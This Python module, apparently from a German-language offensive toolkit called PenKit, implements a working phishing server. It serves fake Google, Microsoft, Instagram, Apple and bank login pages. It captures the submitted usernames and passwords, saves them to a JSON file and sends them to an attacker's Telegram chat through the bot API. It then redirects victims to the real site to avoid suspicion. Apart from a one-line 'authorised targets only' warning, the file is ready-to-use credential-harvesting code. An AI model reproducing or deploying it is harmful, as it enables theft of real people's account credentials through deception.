"""
Eingebauter Phishing-Server — kein GoPhish nötig.

Startet einen leichtgewichtigen HTTP-Server (Python stdlib) der:
  1. Die Fake Login Page ausliefert
  2. POST /capture → speichert Credentials in JSON-Datei + zeigt live an
  3. Alle Requests loggt (IP, User-Agent, Timestamp)
  4. Optional: HTTPS via selbst-signiertem Zertifikat

Zugriffslink z.B.: http://192.168.1.10:8080/?page=google
"""

from __future__ import annotations
import asyncio
import json
import os
import ssl
import urllib.parse
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Phishing Server",
    description=(
        "Startet einen lokalen HTTP(S)-Server mit Fake-Login-Pages. "
        "Captured Credentials werden live angezeigt und in JSON gespeichert."
    ),
    usage="Port wählen, Seite auswählen (google/microsoft/instagram/apple/bank), Link verschicken.",
    danger_note="⛔ BLACK — nur auf autorisierten Zielen verwenden.",
    example="http://<kali-ip>:8080/?page=google",
)

DANGER = DangerLevel.BLACK

_captured: list[dict] = []
_log_path: str = "/tmp/penkit_phish_creds.json"
_page_name: str = "google"
_capture_url: str = "/capture"
_redirect_url: str = "https://google.com"
_telegram_token: str = ""
_telegram_chat_id: str = ""


def _send_telegram_alert(entry: dict):
    """Sendet sofortigen Telegram-Alert wenn Credentials erbeutet werden."""
    if not _telegram_token or not _telegram_chat_id:
        return
    try:
        msg = (
            f"🎣 *PHISHING TREFFER!*\n\n"
            f"🌐 Seite: `{entry.get('page','?')}`\n"
            f"📍 IP: `{entry.get('ip','?')}`\n"
            f"👤 User: `{entry.get('username','?')}`\n"
            f"🔑 Pass: `{entry.get('password','?')}`\n"
            f"🕐 Zeit: `{entry.get('timestamp','?')[:19]}`"
        )
        payload = urllib.parse.urlencode({
            "chat_id": _telegram_chat_id,
            "text": msg,
            "parse_mode": "Markdown",
        }).encode()
        url = f"https://api.telegram.org/bot{_telegram_token}/sendMessage"
        req = urllib.request.Request(url, data=payload)
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default logging — we handle it ourselves

    def _send(self, code: int, body: str, content_type: str = "text/html; charset=utf-8"):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", len(data))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        page = params.get("page", [_page_name])[0]

        from tools.phishing.pages import get_page, PAGES
        if page not in PAGES:
            page = _page_name

        html = get_page(page, capture_url=_capture_url)
        self._send(200, html)

        ts = datetime.now().strftime("%H:%M:%S")
        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "?")[:60]
        print(f"  \033[96m[{ts}]\033[0m \033[93m[VISIT]\033[0m  {ip}  {page}  {ua}")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        params = urllib.parse.parse_qs(body)

        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        ip = self.client_address[0]
        ts = datetime.now().isoformat()
        ua = self.headers.get("User-Agent", "?")

        entry = {
            "timestamp": ts,
            "ip": ip,
            "username": username,
            "password": password,
            "user_agent": ua,
            "page": _page_name,
        }
        _captured.append(entry)

        # Save to file
        with open(_log_path, "w") as f:
            json.dump(_captured, f, indent=2)

        # Console output
        print(f"\n  \033[91m[!!!] CREDENTIALS CAPTURED!\033[0m")
        print(f"  \033[92m  IP       :\033[0m {ip}")
        print(f"  \033[92m  Username :\033[0m {username}")
        print(f"  \033[92m  Password :\033[0m {password}")
        print(f"  \033[92m  Saved to :\033[0m {_log_path}\n")

        # Telegram Alert
        import threading
        threading.Thread(target=_send_telegram_alert, args=(entry,), daemon=True).start()

        # Redirect to real site (no suspicion)
        self.send_response(302)
        self.send_header("Location", _redirect_url)
        self.end_headers()


def _make_ssl_cert(cert_path: str, key_path: str):
    """Generates a self-signed cert if not already present."""
    if os.path.exists(cert_path) and os.path.exists(key_path):
        return
    os.system(
        f"openssl req -x509 -newkey rsa:2048 -keyout {key_path} "
        f"-out {cert_path} -days 365 -nodes "
        f'-subj "/C=DE/O=PenKit/CN=penkit"'
        f" 2>/dev/null"
    )


class PhishingServer:
    def __init__(
        self,
        page: str = "google",
        port: int = 8080,
        use_https: bool = False,
        redirect_url: str = "https://google.com",
        output_dir: str = "/tmp",
        telegram_token: str = "",
        telegram_chat_id: str = "",
    ):
        self.page = page
        self.port = port
        self.use_https = use_https
        self.redirect_url = redirect_url
        self.output_dir = output_dir
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id

    async def start(self) -> AsyncGenerator[str, None]:
        global _page_name, _log_path, _redirect_url, _captured, _telegram_token, _telegram_chat_id
        _page_name        = self.page
        _log_path         = os.path.join(self.output_dir, "penkit_phish_creds.json")
        _redirect_url     = self.redirect_url
        _captured         = []
        _telegram_token   = self.telegram_token
        _telegram_chat_id = self.telegram_chat_id

        proto = "https" if self.use_https else "http"
        yield f"[*] Phishing Server startet..."
        yield f"[*] Seite       : {self.page}"
        yield f"[*] Port        : {self.port}"
        yield f"[*] Credentials : {_log_path}"
        yield f"[+] Phishing-Link: {proto}://<KALI-IP>:{self.port}/?page={self.page}"
        yield f"[*] Ctrl+C zum Stoppen\n"

        server = HTTPServer(("0.0.0.0", self.port), PhishHandler)

        if self.use_https:
            cert = os.path.join(self.output_dir, "phish_cert.pem")
            key  = os.path.join(self.output_dir, "phish_key.pem")
            _make_ssl_cert(cert, key)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert, key)
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
            yield f"[+] HTTPS aktiv (self-signed cert)"

        yield f"[*] Warte auf Opfer...\n"

        loop = asyncio.get_event_loop()
        try:
            await loop.run_in_executor(None, server.serve_forever)
        except asyncio.CancelledError:
            server.shutdown()
            yield f"\n[*] Server gestoppt."
            yield f"[+] {len(_captured)} Credentials gespeichert: {_log_path}"
            if _captured:
                for c in _captured:
                    yield f"  ► {c['ip']}  {c['username']} : {c['password']}"

    def get_captured(self) -> list[dict]:
        return list(_captured)
